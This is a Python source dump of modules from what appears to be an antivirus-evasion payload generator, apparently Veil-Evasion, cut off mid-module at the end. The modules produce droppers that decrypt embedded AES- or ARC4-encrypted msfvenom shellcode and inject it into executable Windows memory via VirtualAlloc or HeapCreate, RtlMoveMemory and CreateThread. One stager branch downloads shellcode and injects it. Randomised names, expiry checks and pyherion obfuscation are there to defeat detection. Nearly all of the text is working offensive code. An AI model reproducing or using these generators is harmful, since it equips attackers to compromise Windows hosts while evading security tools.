        payloadCode += "\t\t%s = bytearray(%s)\n" %(shellcodeBufName,tempShellcodeName)
        # allocate enough virtual memory to stuff the .dll in
        payloadCode += "\t\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n" %(fpName,shellcodeBufName)
        # virtual lock to prevent the memory from paging out to disk
        payloadCode += "\t\tctypes.windll.kernel32.VirtualLock(ctypes.c_int(%s), ctypes.c_int(len(%s)))\n" %(fpName,shellcodeBufName)
        payloadCode += "\t\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)\n" %(tempCBuffer,shellcodeBufName,shellcodeBufName)
        # copy the .dll into the allocated memory
        payloadCode += "\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s), %s, ctypes.c_int(len(%s)))\n" %(fpName,tempCBuffer,shellcodeBufName)
        # kick the thread off to execute the .dll
        payloadCode += "\t\tht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n" %(fpName)
        # wait for the .dll execution to finish
        payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))\n"

        # set up expiration options if specified
        if self.required_options["expire_payload"][0].lower() == "x":
            # download the stager
            payloadCode += "%s = %s()\n" %(shellCodeName, getDataMethodName)
            # inject what we grabbed
            payloadCode += "%s(%s)\n" % (injectMethodName,shellCodeName)
        else:
            # Get our current date and add number of days to the date
            todaysdate = date.today()
            expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
                
            randToday = helpers.randomString()
            randExpire = helpers.randomString()

            payloadCode += 'from datetime import datetime\n'
            payloadCode += 'from datetime import date\n\n'
            payloadCode += randToday + ' = datetime.now()\n'
            payloadCode += randExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
            payloadCode += 'if ' + randToday + ' < ' + randExpire + ':\n'
            # download the stager
            payloadCode += "\t%s = %s()\n" %(shellCodeName, getDataMethodName)
            # inject what we grabbed
            payloadCode += "\t%s(%s)\n" % (injectMethodName,shellCodeName)


        if self.required_options["use_pyherion"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode


########NEW FILE########
__FILENAME__ = aes_encrypt
"""

This payload has AES encrypted shellcode stored within itself.  At runtime, the executable
uses the key within the file to decrypt the shellcode, injects it into memory, and executes it.


Based off of CodeKoala which can be seen here:
http://www.codekoala.com/blog/2009/aes-encryption-python-using-pycrypto/
Looks like Dave Kennedy also used this code in SET
https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/setcore.py.


module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "AES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        
        self.shellcode = shellcode.Shellcode()
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
        
        
    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
            if self.required_options["expire_payload"][0].lower() == "x":
                
                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
        
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
        
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += '\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t' + RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        if self.required_options["inject_method"][0].lower() == "heap":
            if self.required_options["expire_payload"][0].lower() == "x":
                

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                HeapVar = helpers.randomString()
    
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)

                return PayloadCode

            else:
                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                HeapVar = helpers.randomString()

                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
        
                # Create Payload code
                PayloadCode = 'import ctypes\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += '\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
                PayloadCode += '\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)

                return PayloadCode

        else:
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
    
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
        
                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += RandPadding + ' = \'{\'\n'
                PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += ShellcodeVariableName + ' = ' + RandDecodedShellcode + '.decode("string_escape")\n'
                PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += RandShellcode + '()'
    
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:
                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandDecodeAES = helpers.randomString()
                RandCipherObject = helpers.randomString()
                RandDecodedShellcode = helpers.randomString()
                RandShellCode = helpers.randomString()
                RandPadding = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
    
                # encrypt the shellcode and grab the randomized key
                (EncodedShellcode, secret) = encryption.encryptAES(Shellcode)
        
                # Create Payload code
                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'from Crypto.Cipher import AES\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'import os\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandPadding + ' = \'{\'\n'
                PayloadCode += '\t' + RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
                PayloadCode += '\t' + RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
                PayloadCode += '\t' + RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = ' + RandDecodedShellcode + '.decode("string_escape")\n'
                PayloadCode += '\t' + RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += '\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t' + RandShellcode + '()'
    
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode
########NEW FILE########
__FILENAME__ = arc_encrypt
"""

This payload has ARC encrypted shellcode stored within itself.  At runtime, the executable
uses the key within the file to decrypt the shellcode, injects it into memory, and executes it.


Great examples and code adapted from 
http://www.laurentluce.com/posts/python-and-cryptography-with-pycrypto/

module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "ARC4 Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"

        self.shellcode = shellcode.Shellcode()
        
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
        
    
    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
            if self.required_options["expire_payload"][0].lower() == "x":
        
                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandARCKey = helpers.randomString()
                RandARCPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (ARCKey, iv) ) = encryption.encryptARC(Shellcode)
        
                PayloadCode = 'from Crypto.Cipher import ARC4\n'
                PayloadCode += 'import ctypes\n'
                PayloadCode += RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += RandARCKey + ' = \'' + ARCKey + '\'\n'
                PayloadCode += RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
                PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandARCKey = helpers.randomString()
                RandARCPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (ARCKey, iv) ) = encryption.encryptARC(Shellcode)
        
                PayloadCode = 'from Crypto.Cipher import ARC4\n'
                PayloadCode += 'import ctypes\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += '\t' + RandARCKey + ' = \'' + ARCKey + '\'\n'
                PayloadCode += '\t' + RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
                PayloadCode += '\t' + RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = bytearray(' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

        if self.required_options["inject_method"][0].lower() == "heap":
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandARCKey = helpers.randomString()
                RandARCPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                HeapVar = helpers.randomString()
                
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (ARCKey, iv) ) = encryption.encryptARC(Shellcode)
        
                PayloadCode = 'from Crypto.Cipher import ARC4\n'
                PayloadCode += 'import ctypes\n'
                PayloadCode += RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += RandARCKey + ' = \'' + ARCKey + '\'\n'
                PayloadCode += RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
                PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandARCKey = helpers.randomString()
                RandARCPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                HeapVar = helpers.randomString()
                
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (ARCKey, iv) ) = encryption.encryptARC(Shellcode)
        
                PayloadCode = 'from Crypto.Cipher import ARC4\n'
                PayloadCode += 'import ctypes\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += '\t' + RandARCKey + ' = \'' + ARCKey + '\'\n'
                PayloadCode += '\t' + RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
                PayloadCode += '\t' + RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = bytearray(' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
                PayloadCode += '\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)

                return PayloadCode


        else:
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
